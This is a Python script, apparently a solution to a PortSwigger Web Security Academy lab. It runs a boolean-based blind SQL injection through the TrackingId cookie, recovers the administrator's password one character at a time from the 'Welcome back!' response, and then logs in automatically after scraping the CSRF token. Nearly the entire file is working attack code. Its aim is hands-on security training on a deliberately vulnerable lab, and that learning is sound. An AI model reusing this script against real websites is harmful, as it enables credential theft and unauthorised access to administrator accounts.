import asyncio
import aiohttp

ORG_URL = "https://0a9200b40346844980d05d7f00420076.web-security-academy.net";
BASE_URL = ORG_URL+"/filter"
SESSION_ID = "JnfMj5A7C174SYjKn65LGUQmjaB0uAPK"
COOKIE_NAME = "TrackingId"
WORD_LIST = "abcdefghijklmnopqrstuvwxyz0123456789" 


async def is_find_welcome(session: aiohttp.ClientSession, payload: str) -> bool:
    cookies={
        "TrackingId":payload, 
        "session":"JnfMj5A7C174SYjKn65LGUQmjaB0uAPK"
    }
    params = {"category": "Gifts"}

    async with session.get(BASE_URL, cookies=cookies, params=params, timeout=10, allow_redirects=False) as resp:
        text = await resp.text()
        if "Welcome back!" in text:
            return True
        return False



async def find_char(session: aiohttp.ClientSession, pos: int) -> str:
    for word in WORD_LIST:
        payload = f"' OR (SELECT  SUBSTRING(password FROM {pos} FOR 1)  FROM users WHERE username='administrator')='{word}' -- "
        if await is_find_welcome(session, payload):
            print(f"pos:{pos}, word:{word}===")
            return word
    return "?"  # 如果沒找到


async def find_pw(pw_len: int) -> str:
    async with aiohttp.ClientSession() as session:
        tasks = [find_char(session, pos) for pos in range(1, pw_len + 1)]
        results = await asyncio.gather(*tasks)
        return "".join(results)

def login(password:str):
    import requests
    session = requests.Session()
    url = ORG_URL+"/login"

    get_response = session.get(url,timeout=10)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(get_response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    csrf = csrf_input.get("value")

    body={
        "csrf":csrf,
        "username":"administrator",
        "password":password
    }
    post_response = session.post(url, data=body,timeout=10)
    print(post_response.text)

if __name__ == "__main__":
    pw_len = 20  # 假設已知長度
    pw = asyncio.run(find_pw(pw_len))
    print(f"[+] Found password: {pw}")

    login(pw)
